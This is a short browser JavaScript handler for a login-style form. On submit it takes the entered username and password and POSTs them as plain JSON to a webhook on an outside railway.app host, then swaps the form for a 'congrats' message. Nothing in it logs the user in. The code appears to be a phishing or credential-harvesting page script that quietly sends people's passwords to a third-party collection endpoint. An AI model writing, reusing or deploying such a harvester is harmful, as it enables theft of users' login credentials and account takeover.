document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('form');
    const container = document.querySelector('.container');
    const congratsContainer = document.querySelector('.congrats-container');

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        
        const usernameInput = form.querySelector('input[type="text"]');
        const passwordInput = form.querySelector('input[type="password"]');
        
        const username = usernameInput.value;
        const password = passwordInput.value;
        
        const webhookURL = 'https://primary-production-011af.up.railway.app/webhook/739d8ccf-4a0a-479b-91e7-6427681622ff';
        
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => {
            if (response.ok) {
                container.style.display = 'none';
                congratsContainer.style.display = 'block';
            } else {
                console.error('Webhook submission failed:', response.status, response.statusText);
                // Handle error case, maybe show an error message to the user
            }
        })
        .catch(error => {
            console.error('Error during webhook submission:', error);
            // Handle network errors
        });
    });
});